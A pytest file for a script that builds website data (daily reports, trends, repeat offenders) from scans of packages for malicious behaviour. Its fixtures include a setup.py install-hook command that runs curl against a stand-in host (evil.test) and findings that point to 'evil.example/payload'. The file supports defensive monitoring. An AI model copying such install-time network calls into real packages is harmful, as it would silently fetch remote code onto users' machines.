"""Tests for scripts/build_site_data.py."""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))

from build_site_data import build_day_document, build_site_data, build_trends_document


def _write_jsonl(path: Path, documents: list[dict]) -> None:
    path.write_text(
        "\n".join(json.dumps(doc) for doc in documents) + "\n", encoding="utf-8"
    )


def _document(
    name: str,
    tags: list[str],
    version: str | None = None,
    download_url: str | None = None,
) -> dict:
    return {
        "analyzed_at": "2026-07-17T10:00:00+00:00",
        "package": {
            "name": name,
            "path": "/tmp/pkg",  # noqa: S108
            "version": version,
            "download_url": download_url,
        },
        "summary": {"total_findings": 1, "total_files": 1},
        "files": [
            {
                "file": "setup.py",
                "tags": ["packaging"],
                "findings": [
                    {
                        "url": "http://evil.example/payload",
                        "line": 42,
                        "layer": "ast",
                        "tags": tags,
                        "cert_issuer": None,
                        "http_status": None,
                        "http_title": None,
                    }
                ],
            }
        ],
    }


def test_build_day_document_flattens_findings_and_picks_method_and_threat(
    tmp_path: Path,
):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    _write_jsonl(jsonl_path, [_document("evilpkg", ["via_base64", "exfiltration"])])

    document = build_day_document(jsonl_path)

    assert document["stats"] == {"total_packages": 1, "malicious": 1, "clean": 0}
    package = document["packages"][0]
    assert package["name"] == "evilpkg"
    assert package["analyzed_at"] == "2026-07-17T10:00:00+00:00"
    finding = package["findings"][0]
    assert finding["file"] == "setup.py"
    assert finding["method"] == "via_base64"
    assert finding["domain_threat"] == "exfiltration"


def test_build_day_document_picks_via_decoded_method(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    _write_jsonl(jsonl_path, [_document("evilpkg", ["via_decoded", "exfiltration"])])

    document = build_day_document(jsonl_path)

    finding = document["packages"][0]["findings"][0]
    assert finding["method"] == "via_decoded"
    assert finding["domain_threat"] == "exfiltration"


def test_build_day_document_carries_package_version(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    _write_jsonl(jsonl_path, [_document("evilpkg", ["via_base64"], version="1.2.3")])

    document = build_day_document(jsonl_path)

    assert document["packages"][0]["version"] == "1.2.3"


def test_build_day_document_version_none_when_unknown(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])

    document = build_day_document(jsonl_path)

    assert document["packages"][0]["version"] is None


def test_build_day_document_carries_package_download_url(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    _write_jsonl(
        jsonl_path,
        [
            _document(
                "evilpkg",
                ["via_base64"],
                version="1.2.3",
                download_url="https://files.pythonhosted.org/pkg-1.2.3.tar.gz",
            )
        ],
    )

    document = build_day_document(jsonl_path)

    assert (
        document["packages"][0]["download_url"]
        == "https://files.pythonhosted.org/pkg-1.2.3.tar.gz"
    )


def test_build_day_document_clean_package_has_no_domain_threat(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", ["via_concat"])])

    document = build_day_document(jsonl_path)

    assert document["stats"] == {"total_packages": 1, "malicious": 0, "clean": 1}
    assert document["packages"][0]["findings"][0]["domain_threat"] is None


def test_build_day_document_orders_packages_most_recent_first(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-17.jsonl"
    older = {**_document("pkg-a", []), "analyzed_at": "2026-07-17T09:00:00+00:00"}
    newer = {**_document("pkg-b", []), "analyzed_at": "2026-07-17T11:00:00+00:00"}
    _write_jsonl(jsonl_path, [older, newer])

    document = build_day_document(jsonl_path)

    assert [pkg["name"] for pkg in document["packages"]] == ["pkg-b", "pkg-a"]


def test_build_site_data_writes_one_file_per_day_and_an_index(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    _write_jsonl(history_dir / "2026-07-16.jsonl", [_document("pkg-a", [])])
    _write_jsonl(history_dir / "2026-07-17.jsonl", [_document("pkg-b", [])])

    site_data_dir = tmp_path / "site-data"
    dates = build_site_data(history_dir, site_data_dir)

    assert dates == ["2026-07-17", "2026-07-16"]
    assert (site_data_dir / "2026-07-16.json").exists()
    assert (site_data_dir / "2026-07-17.json").exists()

    index = json.loads((site_data_dir / "index.json").read_text(encoding="utf-8"))
    assert index["latest"] == "2026-07-17"
    assert index["dates"] == ["2026-07-17", "2026-07-16"]


def test_build_site_data_empty_history_writes_empty_index(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    site_data_dir = tmp_path / "site-data"

    dates = build_site_data(history_dir, site_data_dir)

    assert dates == []
    index = json.loads((site_data_dir / "index.json").read_text(encoding="utf-8"))
    assert index == {"generated_at": index["generated_at"], "latest": None, "dates": []}


def _binary_document(
    package: str, binaries: list[dict], version: str | None = None
) -> dict:
    return {
        "analyzed_at": "2026-07-19T10:00:00+00:00",
        "package": {
            "name": package,
            "path": "/tmp/pkg",  # noqa: S108
            "version": version,
            "download_url": None,
        },
        "summary": {
            "total_binaries": len(binaries),
            "signed": sum(1 for b in binaries if b["signed"]),
        },
        "binaries": binaries,
    }


def test_build_day_document_includes_binaries_when_present(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-19.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])
    binaries_jsonl_path = tmp_path / "binaries-2026-07-19.jsonl"
    _write_jsonl(
        binaries_jsonl_path,
        [
            _binary_document(
                "evilpkg",
                [
                    {
                        "name": "helper.dll",
                        "file": "native/helper.dll",
                        "sha256": "a" * 64,
                        "format": "pe",
                        "signed": True,
                        "signer": "CN=Example Corp",
                    }
                ],
            )
        ],
    )

    document = build_day_document(jsonl_path, binaries_jsonl_path)

    assert len(document["binaries"]) == 1
    group = document["binaries"][0]
    assert group["package"] == "evilpkg"
    assert group["binaries"][0]["name"] == "helper.dll"


def test_build_day_document_carries_binary_package_version(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-19.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])
    binaries_jsonl_path = tmp_path / "binaries-2026-07-19.jsonl"
    _write_jsonl(
        binaries_jsonl_path,
        [_binary_document("evilpkg", [], version="4.5.6")],
    )

    document = build_day_document(jsonl_path, binaries_jsonl_path)

    assert document["binaries"][0]["version"] == "4.5.6"


def test_build_day_document_binaries_empty_when_not_provided(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-19.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])

    document = build_day_document(jsonl_path)

    assert document["binaries"] == []


def test_build_site_data_reads_binaries_subdir(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    _write_jsonl(history_dir / "2026-07-19.jsonl", [_document("pkg-a", [])])
    binaries_dir = history_dir / "binaries"
    binaries_dir.mkdir()
    _write_jsonl(
        binaries_dir / "2026-07-19.jsonl",
        [
            _binary_document(
                "pkg-a",
                [
                    {
                        "name": "x.so",
                        "file": "x.so",
                        "sha256": "b" * 64,
                        "format": "elf",
                        "signed": False,
                        "signer": None,
                    }
                ],
            )
        ],
    )

    site_data_dir = tmp_path / "site-data"
    build_site_data(history_dir, site_data_dir)

    day_doc = json.loads(
        (site_data_dir / "2026-07-19.json").read_text(encoding="utf-8")
    )
    assert len(day_doc["binaries"]) == 1
    assert day_doc["binaries"][0]["binaries"][0]["name"] == "x.so"


def test_build_site_data_no_binaries_subdir_is_empty(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    _write_jsonl(history_dir / "2026-07-19.jsonl", [_document("pkg-a", [])])

    site_data_dir = tmp_path / "site-data"
    build_site_data(history_dir, site_data_dir)

    day_doc = json.loads(
        (site_data_dir / "2026-07-19.json").read_text(encoding="utf-8")
    )
    assert day_doc["binaries"] == []


def test_build_site_data_writes_trends_json(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    _write_jsonl(
        history_dir / "2026-07-15.jsonl",
        [_document("evilpkg", ["via_base64", "exfiltration"])],
    )
    _write_jsonl(
        history_dir / "2026-07-16.jsonl",
        [_document("evilpkg", ["via_base64", "exfiltration"])],
    )

    site_data_dir = tmp_path / "site-data"
    build_site_data(history_dir, site_data_dir)

    trends = json.loads((site_data_dir / "trends.json").read_text(encoding="utf-8"))
    assert [d["date"] for d in trends["daily"]] == ["2026-07-15", "2026-07-16"]
    assert trends["repeat_offenders"][0]["name"] == "evilpkg"
    assert trends["top_domains"][0]["domain"] == "evil.example"


def test_build_site_data_empty_history_writes_empty_trends(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    site_data_dir = tmp_path / "site-data"

    build_site_data(history_dir, site_data_dir)

    trends = json.loads((site_data_dir / "trends.json").read_text(encoding="utf-8"))
    assert trends["daily"] == []
    assert trends["top_domains"] == []
    assert trends["repeat_offenders"] == []


def _finding(url: str, domain_threat: str | None = None) -> dict:
    return {
        "url": url,
        "file": "setup.py",
        "line": 1,
        "layer": "ast",
        "method": None,
        "domain_threat": domain_threat,
        "http_status": None,
        "http_title": None,
        "cert_issuer": None,
    }


def _trends_pkg(name: str, findings: list[dict]) -> dict:
    return {
        "name": name,
        "version": None,
        "download_url": None,
        "analyzed_at": "2026-07-15T10:00:00+00:00",
        "total_findings": len(findings),
        "findings": findings,
    }


def _trends_day(date: str, packages: list[dict]) -> tuple[str, dict]:
    malicious = sum(
        1 for pkg in packages if any(f["domain_threat"] for f in pkg["findings"])
    )
    return (
        date,
        {
            "stats": {
                "total_packages": len(packages),
                "malicious": malicious,
                "clean": len(packages) - malicious,
            },
            "packages": packages,
            "binaries": [],
        },
    )


def test_build_trends_document_daily_series_ascending_with_counts():
    day1 = _trends_day(
        "2026-07-15", [_trends_pkg("a", [_finding("http://x.example/1")])]
    )
    day2 = _trends_day(
        "2026-07-16",
        [
            _trends_pkg("b", [_finding("http://evil.example/2", "exfiltration")]),
            _trends_pkg("c", []),
        ],
    )

    trends = build_trends_document([day2, day1])  # out of order on purpose

    assert trends["daily"] == [
        {
            "date": "2026-07-15",
            "total_packages": 1,
            "malicious_packages": 0,
            "total_findings": 1,
        },
        {
            "date": "2026-07-16",
            "total_packages": 2,
            "malicious_packages": 1,
            "total_findings": 1,
        },
    ]


def test_build_trends_document_top_domains_only_counts_threat_tagged_findings():
    day = _trends_day(
        "2026-07-15",
        [
            _trends_pkg(
                "a",
                [
                    _finding("http://benign.example/x"),
                    _finding("http://evil.example/y", "exfiltration"),
                ],
            )
        ],
    )

    trends = build_trends_document([day])

    assert trends["top_domains"] == [
        {"domain": "evil.example", "count": 1, "threat": "exfiltration"}
    ]


def test_build_trends_document_top_domains_ranks_desc_and_caps_at_ten():
    packages = [
        _trends_pkg(
            f"pkg{i}",
            [
                _finding(f"http://domain{i}.example/{n}", "exfiltration")
                for n in range(11 - i)
            ],
        )
        for i in range(11)
    ]
    day = _trends_day("2026-07-15", packages)

    trends = build_trends_document([day])

    assert len(trends["top_domains"]) == 10
    assert trends["top_domains"][0] == {
        "domain": "domain0.example",
        "count": 11,
        "threat": "exfiltration",
    }
    assert "domain10.example" not in [d["domain"] for d in trends["top_domains"]]


def test_build_trends_document_repeat_offenders_requires_two_malicious_days():
    day1 = _trends_day(
        "2026-07-10",
        [_trends_pkg("evilpkg", [_finding("http://evil.example/1", "exfiltration")])],
    )
    day2 = _trends_day(
        "2026-07-11",
        [_trends_pkg("evilpkg", [_finding("http://evil.example/2", "exfiltration")])],
    )
    day3 = _trends_day(
        "2026-07-12",
        [_trends_pkg("onceonly", [_finding("http://evil.example/3", "exfiltration")])],
    )

    trends = build_trends_document([day1, day2, day3])

    assert [r["name"] for r in trends["repeat_offenders"]] == ["evilpkg"]
    entry = trends["repeat_offenders"][0]
    assert entry["days_seen"] == 2
    assert entry["total_findings"] == 2
    assert entry["first_seen"] == "2026-07-10"
    assert entry["last_seen"] == "2026-07-11"


def test_build_trends_document_repeat_offenders_sorted_by_days_then_findings():
    days = [
        _trends_day(
            "2026-07-01",
            [_trends_pkg("pkgA", [_finding("http://evil.example/1", "exfiltration")])],
        ),
        _trends_day(
            "2026-07-02",
            [_trends_pkg("pkgA", [_finding("http://evil.example/2", "exfiltration")])],
        ),
        _trends_day(
            "2026-07-03",
            [_trends_pkg("pkgA", [_finding("http://evil.example/3", "exfiltration")])],
        ),
        _trends_day(
            "2026-07-04",
            [
                _trends_pkg(
                    "pkgB",
                    [
                        _finding(f"http://evil.example/b{n}", "exfiltration")
                        for n in range(5)
                    ],
                ),
                _trends_pkg(
                    "pkgC", [_finding("http://evil.example/c1", "exfiltration")]
                ),
            ],
        ),
        _trends_day(
            "2026-07-05",
            [
                _trends_pkg(
                    "pkgB", [_finding("http://evil.example/b5", "exfiltration")]
                ),
                _trends_pkg(
                    "pkgC", [_finding("http://evil.example/c2", "exfiltration")]
                ),
            ],
        ),
    ]

    trends = build_trends_document(days)

    assert [r["name"] for r in trends["repeat_offenders"]] == ["pkgA", "pkgB", "pkgC"]


def test_build_trends_document_empty_input_returns_empty_lists():
    trends = build_trends_document([])

    assert trends["daily"] == []
    assert trends["top_domains"] == []
    assert trends["repeat_offenders"] == []


def _install_hook_document(
    package: str,
    install_hooks: list[dict],
    version: str | None = None,
    download_url: str | None = None,
) -> dict:
    return {
        "analyzed_at": "2026-07-20T10:00:00+00:00",
        "package": {
            "name": package,
            "path": "/tmp/pkg",  # noqa: S108
            "version": version,
            "download_url": download_url,
        },
        "summary": {"total_findings": len(install_hooks)},
        "install_hooks": install_hooks,
    }


def test_build_day_document_includes_install_hooks_when_present(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-20.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])
    install_hooks_jsonl_path = tmp_path / "install_hooks-2026-07-20.jsonl"
    _write_jsonl(
        install_hooks_jsonl_path,
        [
            _install_hook_document(
                "evilpkg",
                [
                    {
                        "file": "setup.py",
                        "line": 12,
                        "call": "subprocess.Popen",
                        "context": "module",
                        "source": "setup_py",
                    }
                ],
            )
        ],
    )

    document = build_day_document(
        jsonl_path, install_hooks_jsonl_path=install_hooks_jsonl_path
    )

    assert len(document["install_hooks"]) == 1
    group = document["install_hooks"][0]
    assert group["package"] == "evilpkg"
    assert group["install_hooks"][0]["call"] == "subprocess.Popen"


def test_build_day_document_install_hooks_carries_download_url(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-20.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])
    install_hooks_jsonl_path = tmp_path / "install_hooks-2026-07-20.jsonl"
    _write_jsonl(
        install_hooks_jsonl_path,
        [
            _install_hook_document(
                "evilpkg",
                [
                    {
                        "file": "setup.py",
                        "line": 12,
                        "call": "subprocess.Popen",
                        "command": "subprocess.Popen(['curl', 'http://evil.test'])",
                        "context": "module",
                        "source": "setup_py",
                    }
                ],
                download_url="https://files.pythonhosted.org/evilpkg-1.0.tar.gz",
            )
        ],
    )

    document = build_day_document(
        jsonl_path, install_hooks_jsonl_path=install_hooks_jsonl_path
    )

    group = document["install_hooks"][0]
    assert group["download_url"] == "https://files.pythonhosted.org/evilpkg-1.0.tar.gz"


def test_build_day_document_install_hooks_empty_when_not_provided(tmp_path: Path):
    jsonl_path = tmp_path / "2026-07-20.jsonl"
    _write_jsonl(jsonl_path, [_document("cleanpkg", [])])

    document = build_day_document(jsonl_path)

    assert document["install_hooks"] == []


def test_build_site_data_reads_install_hooks_subdir(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    _write_jsonl(history_dir / "2026-07-20.jsonl", [_document("pkg-a", [])])
    install_hooks_dir = history_dir / "install_hooks"
    install_hooks_dir.mkdir()
    _write_jsonl(
        install_hooks_dir / "2026-07-20.jsonl",
        [
            _install_hook_document(
                "pkg-a",
                [
                    {
                        "file": "pkg/__init__.py",
                        "line": 3,
                        "call": "socket.create_connection",
                        "context": "module",
                        "source": "package_init",
                    }
                ],
            )
        ],
    )

    site_data_dir = tmp_path / "site-data"
    build_site_data(history_dir, site_data_dir)

    day_doc = json.loads(
        (site_data_dir / "2026-07-20.json").read_text(encoding="utf-8")
    )
    assert len(day_doc["install_hooks"]) == 1
    assert (
        day_doc["install_hooks"][0]["install_hooks"][0]["call"]
        == "socket.create_connection"
    )


def test_build_site_data_no_install_hooks_subdir_is_empty(tmp_path: Path):
    history_dir = tmp_path / "history"
    history_dir.mkdir()
    _write_jsonl(history_dir / "2026-07-20.jsonl", [_document("pkg-a", [])])

    site_data_dir = tmp_path / "site-data"
    build_site_data(history_dir, site_data_dir)

    day_doc = json.loads(
        (site_data_dir / "2026-07-20.json").read_text(encoding="utf-8")
    )
    assert day_doc["install_hooks"] == []
